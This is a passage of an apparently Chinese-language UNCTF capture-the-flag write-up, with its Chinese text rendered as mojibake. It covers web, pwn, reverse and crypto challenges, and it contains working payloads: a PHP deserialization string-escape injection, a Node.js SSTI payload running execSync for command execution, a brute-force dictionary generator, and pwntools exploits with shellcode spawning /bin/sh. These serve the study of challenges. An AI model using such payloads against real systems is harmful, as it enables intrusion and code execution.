UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:1:&quot;y&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125; ç”±äºèƒ½POSTä¼ å…¥çš„åªæœ‰åºåˆ—åŒ–éƒ¨åˆ†çš„ç±» UNCTF å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ç»™ name ä¼ å…¥æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œserialize() åæˆªæ–­æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼›ç»™email ä¼ å…¥è¿‡æ»¤å…³é”®å­—ï¼Œfilter() ä¹‹åä½¿åŸæœ‰é•¿åº¦å€¼ä¸éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸²é•¿åº¦ç›¸ç­‰ï¼Œä¿ç•™æ¶æ„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæœ€åç» unserialize() æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹å®Œæˆåˆ©ç”¨é“¾ã€‚ å°è¯•ä¼ å€¼ï¼š 12345678910&lt;?php...$name = &#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;;$pass = &#x27;x&#x27;;$email = &#x27;phpphp&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€‘æˆªæ–­ è®¡ç®—éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸² &quot;;s:4:&quot;name&quot;;s:245:&quot;z é•¿åº¦ä¸º21ï¼Œåˆ™ä½¿å¾—åŸæœ‰é•¿åº¦å€¼ä¸éœ€å»é™¤çš„æ­£å¸¸å­—ç¬¦ä¸²é•¿åº¦ç›¸ç­‰ï¼Œåˆ™éœ€è¦ 21/len(&#39;php&#39;)=21/3=7 ä¸ª php ï¼Œå†å°† /etc/passwd æ¢æˆ /flagï¼š 12345678910&lt;?php...$name = &#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;;$pass = &#x27;x&#x27;;$email = &#x27;phpphpphpphpphpphpphp&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;ã€‘æˆªæ–­ æ³¨æ„ flag ä¹Ÿè¢«è¿‡æ»¤ï¼ŒåŒå†™ç»•è¿‡å³å¯ã€‚ Payloadï¼š http://xxx?a[]=1&amp;b[]=2ï¼ŒPOSTä¼ å‚ name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp flagï¼šUNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125; â€‹ nodejs_sstiä¸€ä¸ªè¾“å…¥æ¡†å’Œæäº¤æŒ‰é’®ï¼Œå°è¯•SSTIè¾“å…¥ &#123;&#123;2*3&#125;&#125; ï¼Œå‘ç°åˆ©ç”¨ç‚¹åœ¨titleå€¼ã€‚ å°è¯• &#123;&#123;print(xx)&#125;&#125; å‡ºç°æŠ¥é”™ï¼š 1234567891011TypeError: getValue(...) is not a function at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63) at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42) at /app/node_modules/sodajs/dist/soda.js:188:44 at String.replace (&lt;anonymous&gt;) at compile (/app/node_modules/sodajs/dist/soda.js:187:53) at /app/node_modules/sodajs/dist/soda.js:257:21 at Array.map (&lt;anonymous&gt;) at compile (/app/node_modules/sodajs/dist/soda.js:256:55) at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13) at /app/node_modules/sodajs/dist/soda.js:130:23 è¯´æ˜ä»£ç ä½¿ç”¨çš„æ˜¯soda.jsï¼Œå®é™…æ˜¯node.jsæ³¨å…¥ï¼Œåˆ©ç”¨node.jsç‰¹æ€§ä½¿ç”¨ child_process è°ƒç”¨ execSync() æ–¹æ³•RCEã€‚ Payloadï¼š http://xxx/who POSTä¼ å‚ name=&#123;&#123;\" \".toString.constructor(\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()\")()&#125;&#125;&amp;brand=web flagï¼šUNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125; â€‹ encrypt_login å¬è¯´ä½ å¾ˆæ“…é•¿æ’åº“ï¼Ÿ éšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œè¿”å›æç¤ºå¯†ç ä¸ºçº¯æ•°å­—ï¼š I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :) æŸ¥çœ‹æºç å‘ç°å‰ç«¯åŠ å¯†jsæ–‡ä»¶ encrypto.jsï¼Œä»£ç å·²æ··æ·†ï¼Œæ ¹æ® jsjiami.com.v6 å­—æ ·ï¼Œä½¿ç”¨ JSDec åœ¨çº¿è§£æ··æ·†æœ‰ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* *Progcessed By JSDec in 0.01s *JSDec - JSDec.js.org */$(&#x27;#submit&#x27;)[&#x27;click&#x27;](function() &#123; var _0x326c0f = &#123; &#x27;DTeqY&#x27;: function(_0x1553aa, _0x4bb167) &#123; return _0x1553aa == _0x4bb167; &#125;, &#x27;IeKGb&#x27;: function(_0x2ec083, _0x47b18b, _0x120b6a) &#123; return _0x2ec083(_0x47b18b, _0x120b6a); &#125;, &#x27;foePj&#x27;: &#x27;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\\nKJVXPMuQVgrw/SxkBQIDAQAB\\n-----END PUBLIC KEY-----&#x27;, &#x27;iaWKq&#x27;: function(_0x1c6939, _0x219dc9) &#123; return _0x1c6939 + _0x219dc9; &#125;, &#x27;PUpKG&#x27;: function(_0x213ed6, _0xe318d3) &#123; return _0x213ed6 + _0xe318d3; &#125;, &#x27;JNTjF&#x27;: &#x27;#username&#x27;, &#x27;OSnwF&#x27;: function(_0xd115dc, _0x2bfff6) &#123; return _0xd115dc(_0x2bfff6); &#125;, &#x27;bZMhU&#x27;: &#x27;post&#x27;, &#x27;otSyR&#x27;: function(_0x486713, _0x17d2bc) &#123; return _0x486713 + _0x17d2bc; &#125; &#125;; var _0x5182d1 = new JSEncrypt(); let _0x20b0a1 = _0x326c0f[&#x27;foePj&#x27;]; _0x5182d1[&#x27;setPublicKey&#x27;](_0x20b0a1); var _0x4833f6 = _0x5182d1[&#x27;encrypt&#x27;](_0x326c0f[&#x27;iaWKq&#x27;](_0x326c0f[&#x27;PUpKG&#x27;]($(_0x326c0f[&#x27;JNTjF&#x27;])[&#x27;val&#x27;](), &#x27;|-|&#x27;), _0x326c0f[&#x27;OSnwF&#x27;]($, &#x27;#password&#x27;)[&#x27;val&#x27;]())); $[&#x27;ajax&#x27;](&#123; &#x27;url&#x27;: &#x27;login.php&#x27;, &#x27;type&#x27;: _0x326c0f[&#x27;bZMhU&#x27;], &#x27;data&#x27;: _0x326c0f[&#x27;otSyR&#x27;](&#x27;data=&#x27;, _0x4833f6), &#x27;success&#x27;: function(_0x1626c4) &#123; coco[&#x27;alert&#x27;](&#123; &#x27;title&#x27;: &#x27;é»æ„®ãš&#x27;, &#x27;text&#x27;: _0x1626c4 &#125;); if (_0x326c0f[&#x27;DTeqY&#x27;](_0x1626c4, &#x27;ç™»å½•æˆåŠŸ&#x27;)) &#123; _0x326c0f[&#x27;IeKGb&#x27;](setTimeout, function() &#123; location[&#x27;reload&#x27;](); &#125;, 0x3e8); &#125; &#125; &#125;);&#125;);;_0xod5 = &#x27;jsjiami.com.v6&#x27; åˆ†æå‘ç°ï¼Œå‰ç«¯è¾“å…¥çš„è´¦å·å¯†ç ï¼Œä»¥ username|-|password çš„æ–¹å¼ç»„åˆåï¼Œå†ç»RSAåŠ å¯†å¾—åˆ°base64å¯†æ–‡ã€‚ ç”Ÿæˆçˆ†ç ´ç”¨å­—å…¸ï¼š 123456789101112131415161718192021import base64from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAfrom tqdm import tqdmf = open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)public_key = &#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgUWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPEHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8LrKJVXPMuQVgrw/SxkBQIDAQAB-----END PUBLIC KEY-----&#x27;&#x27;&#x27;for i in tqdm(range(10000)): password = str(i) m = &#x27;admin|-|&#x27; + password rsakey = RSA.importKey(public_key) cipher = Cipher_pkcs1_v1_5.new(rsakey) cipher_text = base64.b64encode(cipher.encrypt(m)) f.write(cipher_text+&#x27;\\n&#x27;) æœ€åä¸ŠBurpsuiteï¼ŒåŠ è½½æ–°å­—å…¸dict.txtï¼Œçˆ†ç ´æ‹¿åˆ°flagã€‚ â€‹ # Pwnfoå…³é”®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); speaking(); leak(); return 0;&#125;int speaking()&#123; return puts( &quot;Do you know the format string?\\n&quot; &quot; you can message at here:\\n&quot; &quot; https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;);&#125;unsigned __int64 leak()&#123; char s[88]; // [rsp+0h] [rbp-60h] BYREF unsigned __int64 v2; // [rsp+58h] [rbp-8h] v2 = __readfsqword(0x28u); puts( &quot;I heared that you are interested in the CTF.\\n&quot; &quot; I hope that you will hold on to keep your interest\\n&quot; &quot; tell me,will you?&quot;); fgets(s, 80, stdin); puts(&quot;I will remember what you said&quot;); printf(s); puts(&quot;wait for your good news...&quot;); gets(s); return __readfsqword(0x28u) ^ v2;&#125; checksecå‘ç°å­˜åœ¨canaryï¼Œåˆ©ç”¨leak() ä¸­å­˜åœ¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canaryï¼Œå†å®ç°ret2textã€‚ Payloadï¼š 1234567891011121314151617from pwn import *r=remote(&#x27;node2.hackingfor.fun&#x27;,38793)[r.recvline() for i in range(6)]r.sendline(&#x27;%17$p&#x27;)r.recvline()canary = int(r.recvline().strip()[2:],16)print(hex(canary))r.recvline()backdoor_addr = 0x40080Dpl = &#x27;a&#x27;*(0x60-8)+p64(canary)+&#x27;a&#x27;*8+p64(backdoor_addr)r.sendline(pl)print(r.recvall()) â€‹ scå…³é”®ä»£ç ï¼š 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[16]; // [rsp+0h] [rbp-10h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); init(); puts(&quot;Do you know the ShellCode?&quot;); puts(&quot;\\n\\n\\n---------^-^----------&quot;); puts(&quot;show me your Migic&quot;); read_shell_code(); puts(&quot;Have you finished?&quot;); read(0, buf, 0x20uLL); puts(&quot;~Bye&quot;); return 0;&#125;ssize_t read_shell_code()&#123; return read(0, &amp;buf, 0x5AuLL);&#125; read_shell_code() å°†è¾“å…¥çš„shellcodeå†™å…¥bssæ®µ buf åŒºåŸŸï¼Œå†é€šè¿‡ read() å®ç°ret2shellcodeã€‚ Payloadï¼š 12345678910111213141516171819202122from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,34717)context.arch = &#x27;amd64&#x27;r.recvuntil(&#x27;show me your Migic\\n&#x27;)shellcode = asm(&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622fpush rbxmov rdi,rspxor rsi,rsixor rdx,rdxmov rax,0x3bsyscall&#x27;&#x27;&#x27;)print(shellcode)r.send(shellcode)r.recvline()bss_addr = 0x601080pl = &#x27;a&#x27;*(0x10+8)+p64(0x601080)r.send(pl)r.interactive() â€‹ magic_intå…³é”®ä»£ç ï¼š 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); __isoc99_scanf(&amp;unk_400959, &amp;v4); if ( v4 &lt; 0 ) &#123; v4 = -v4; if ( v4 &lt; 0 ) EDG(); &#125; return 0;&#125;__int64 EDG()&#123; char v1[112]; // [rsp+0h] [rbp-70h] BYREF puts(s); return gets(v1);&#125; cä¸­intå–å€¼èŒƒå›´ä¸º -2147483648 ~ +2147483647ï¼Œè€Œ -2147483648 åˆšå¥½ä¸ºå–åå‘ç”Ÿä¸Šæº¢çš„æ•°ï¼Œä¼ å…¥å³å¯è¿›å…¥ EDG()ï¼Œå†ret2textã€‚ Payloadï¼š 123456789101112from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,38780)backdoor = 0x400781r.send(&#x27;-2147483648\\x00&#x27;)p.recv()pay = &#x27;a&#x27; * 0x77 + p64(backdoor)r.send(pay)r.interactive() â€‹ magic_abså…³é”®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned int v5; // [rsp+Ch] [rbp-84h] BYREF char s[92]; // [rsp+10h] [rbp-80h] BYREF int v7; // [rsp+6Ch] [rbp-24h] BYREF time_t timer; // [rsp+70h] [rbp-20h] BYREF __int64 v9; // [rsp+78h] [rbp-18h] unsigned int v10; // [rsp+80h] [rbp-10h] int v11; // [rsp+84h] [rbp-Ch] unsigned int v12; // [rsp+88h] [rbp-8h] unsigned int v13; // [rsp+8Ch] [rbp-4h] init(argc, argv, envp); v3 = time(&amp;timer); srand(v3); memset(s, 0, 0x50uLL); puts(&quot;What&#x27;s your name?&quot;); v11 = read(0, s, 0x50uLL); puts(&quot;Tell me your a g e:&quot;); fflush(stdout); __isoc99_scanf(&quot;%d&quot;, &amp;v7); puts(&quot;What&#x27;s your lucky number?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v5); v10 = abs32(v5); v9 = (int)(v10 + v11); v12 = 1; if ( v9 &gt;= 0 ) &#123; s[10] = 0; printf(&quot;Hi,%s And see you next time!\\n&quot;, s); v12 = 0; &#125; puts(&quot;Recording...&quot;); if ( v12 ) v13 = rand() % (((int)abs32(v5 + v7) &gt;&gt; v7) + 1); else v13 = rand() % 10000; record(s, v5, v13, v12); return 0;&#125;void *__fastcall record(const char *a1, unsigned int a2, unsigned int a3, int a4)&#123; size_t v4; // rax char dest[16]; // [rsp+20h] [rbp-10h] BYREF printf(&quot;\\n name: %s \\n lucky number: %d \\n tag: %d\\n DOWN!\\n&quot;, a1, a2, a3); v4 = strlen(a1); if ( a4 ) return memcpy(&amp;dest[a3], a1, v4); else return memcpy(dest, a1, v4);&#125; æ„é€  v7 å’Œ v5ï¼Œä½¿å¾— (((int)abs32(v5 + v7) &gt;&gt; v7) + 1) ä¸º1ï¼Œv13 ä¸å†éšæœºåªèƒ½å–0ï¼Œåœ¨ record() ä¸­ï¼Œè¾“å…¥çš„ s ä½œä¸ºpayloadå¤åˆ¶åˆ° dest åŒºåŸŸï¼Œé€ æˆæ ˆæº¢å‡ºã€‚ æœ¬åœ°æµ‹è¯•ï¼š 123456789#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;stdlib.h&gt;int main() &#123; unsigned int v5 = -2147483647; printf(&quot;%d\\n&quot;,(int)v5); //-2147483647 int v7 = 2147483647; printf(&quot;%d\\n&quot;,((int)(v5+v7))&gt;&gt;v7); //0&#125; Payloadï¼š 12345678910111213from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,36236)print(r.recvline())backdoor_addr = 0x4009D7pl = &#x27;a&#x27;*(0x10+8)+p64(backdoor_addr)r.send(pl)print(r.recvline())r.sendline(&#x27;2147483647&#x27;)print(r.recvline())r.sendline(&#x27;-2147483647&#x27;)r.interactive() â€‹ # Reverseezlogin ç¨‹åºæµç¨‹è¯†åˆ«ï¼Œç®—æ³•é€†å‘ login() ä¸­ pqsd`fl&#123;zmpZsag&#125;wdYVkUNC ä¸ 0x16 å¼‚æˆ–å¾—åˆ° fgervpzml&#123;fLewqkarO@&#125;CXUï¼Œå†8ä½ä¸€ç»„ä¸Šä¸‹æ’åˆ—ï¼Œä»ä¸Šå¾€ä¸‹å–å‡ºè¿æˆï¼šflag&#123;refOrL@ve&#125;pwCzqXmkUã€‚ flagï¼šflag&#123;refOrL@ve&#125; â€‹ rejunk åƒåœ¾ä»£ç æ··æ·†ï¼Œå¼‚æˆ–ç®—æ³•é€†å‘ æŸ¥çœ‹ä¼ªä»£ç å‘ç°å¤¹è¿›å¾ˆå¤šåƒåœ¾ä»£ç ï¼Œè·Ÿè¿›å‡ è¡Œæœ‰ç”¨çš„ä»£ç ï¼š 123456__main();puts(&quot;input your answer:&quot;);scanf(&quot;%s&quot;, v14);sprintf(Buffer, &quot;%s%s%s%s&quot;, &quot;WQGUL&quot;, &quot;xb&gt;2:&quot;, &quot;ooh95=&quot;, &quot;&#x27;&#x27;twk&quot;);if ( (v9 ^ (v14[v9] + 2)) != Buffer[v9] ) break; è„šæœ¬é€†è§£ï¼š 1234567s = list(b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;)t = []for i in range(len(s)): t.append((s[i]^i)-2)print(bytes(t))# b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27; flagï¼šUNCTF&#123;b781cbb29054db&#125; â€‹ py_trade EZ opcode! Give me your PY, and iâ€™ll give you flag! è¿˜åŸpythonå­—èŠ‚ç ï¼š 123456789flag = &#x27;XXXXXX&#x27;num = [0]*18k = 0for i in range(len(flag)): num[i] = (ord(flag[i])+i)^(k%3+1) num[len(flag)-i-1] = (ord(flag[len(flag)-i-1])+len(flag)-i-1)^(k%3+1) k += 1print(num)#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49] ç”¨z3è§£ï¼š 12345678910111213141516171819from z3 import *s = Solver()num = [115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]flag = [BitVec(&#x27;flag%d&#x27;%i,8) for i in range(len(num))]res = [-1]*len(num)k = 0for i in range(len(num)): res[i] = (flag[i]+i)^(k%3+1) res[len(flag)-i-1] = (flag[len(flag)-i-1]+len(flag)-i-1)^(k%3+1) k += 1for i in range(len(num)): s.add(res[i]==num[i])if s.check() == sat: m = s.model() print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag)) # py_Trad3_1s_fuNny! flagï¼šunctf&#123;py_Trad3_1s_fuNny!&#125; â€‹ ezDriver ä½ äº†è§£è¿‡é©±åŠ¨å˜›ï¼Ÿè¯•è¯•çœ‹å§ï¼ åˆ†æé€»è¾‘ï¼ŒDriverEntry() -&gt; sub_140086000() -&gt; sub_140085268() -&gt; sub_140085000() -&gt; sub_140085020()ã€‚ ä¸»ç¨‹åºé€»è¾‘åœ¨ sub_140085020()ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall sub_140085020(volatile void *Address, __int64 a2)&#123; int v4; // ecx __int64 v5; // rax unsigned __int64 v6; // r8 int v8; // ecx __int64 v9; // [rsp+20h] [rbp-828h] char v10[2048]; // [rsp+30h] [rbp-818h] BYREF sub_140001640(v10, 0i64, 2048i64); ProbeForRead(Address, 0x800ui64, 1u); DbgPrintEx(0x4Du, 3u, &quot;[+] UserBuffer: 0x%p\\n&quot;, (const void *)Address); DbgPrintEx(0x4Du, 3u, &quot;[+] UserBuffer Size: 0x%zX\\n&quot;, a2); DbgPrintEx(0x4Du, 3u, &quot;[+] KernelBuffer: 0x%p\\n&quot;, v10); DbgPrintEx(0x4Du, 3u, &quot;[+] KernelBuffer Size: 0x%zX\\n&quot;, 0x800ui64); v4 = 0; LODWORD(v9) = 0; while ( (unsigned __int64)v4 &lt; 0x200 ) &#123; byte_140083090[v4] = v10[4 * v4]; LODWORD(v9) = ++v4; &#125; sub_140001000(byte_140083090, (unsigned int)dword_140003028, &amp;unk_140003030);// XXTEAåŠ å¯† v5 = -1i64; v6 = -1i64; do ++v6; while ( byte_140003000[v6] ); do ++v5; while ( byte_140083090[v5] ); if ( v5 == v6 ) &#123; v8 = 0; HIDWORD(v9) = 0; while ( v8 &lt; v6 ) &#123; if ( byte_140003000[v8] != byte_140083090[v8] )// æ¯”è¾ƒ &#123; DbgPrintEx(0x4Du, 3u, &quot;[*] flag wrong!&quot;, byte_140003000, v9); return 0i64; &#125; HIDWORD(v9) = ++v8; &#125; DbgPrintEx(0x4Du, 3u, &quot;[*] you are right@&quot;, byte_140003000, v9); DbgPrintEx(0x4Du, 3u, &quot;[+] Triggering Buffer Overflow in Stack\\n&quot;); sub_140001380(v10, Address, a2); return 0i64; &#125; else &#123; DbgPrintEx(0x4Du, 3u, &quot;[*] flag Wrong!&quot;, byte_140003000, v9); return 0i64; &#125;&#125; å‘ç°é€šè¿‡åŠ å¯†å‡½æ•° sub_140001000() åï¼Œå¾—åˆ°çš„ç»“æœ byte_140083090 ä¸ byte_140003000 ä½œæ¯”è¾ƒã€‚ è·Ÿè¿›åŠ å¯†å‡½æ•° sub_140001000()ï¼Œç”±ç‰¹å¾çŸ¥ä¸ºXXTEAåŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨çš„keyä¸º unk_140003030=[1,2,3,4]ã€‚ è„šæœ¬è§£å¯†ï¼š 1234567891011121314151617181920212223242526272829303132def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: key = [1, 2, 3, 4] s = &#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27; s = [s[8*k:8*k+8] for k in range(len(s)//8)] s = [bytes.fromhex(k)[::-1].hex() for k in s] encrypted = [int(k,16) for k in s] decrypted = decrypt(encrypted, key) decrypted = [hex(k)[2:] for k in decrypted][:-1] flag = [bytes.fromhex(k)[::-1] for k in decrypted] print(b&#x27;&#x27;.join(flag))# b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27; flagï¼šunctf&#123;Do_you_want_to_a_cup_of_tea?&#125; â€‹ # Cryptoeasy_rsa ç®€å•çš„RSA 1234q= 9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471p= 12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101c= 28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225e = 65537 RSAåŸºæ“ã€‚ 1234567891011q = 9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471p = 12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101c = 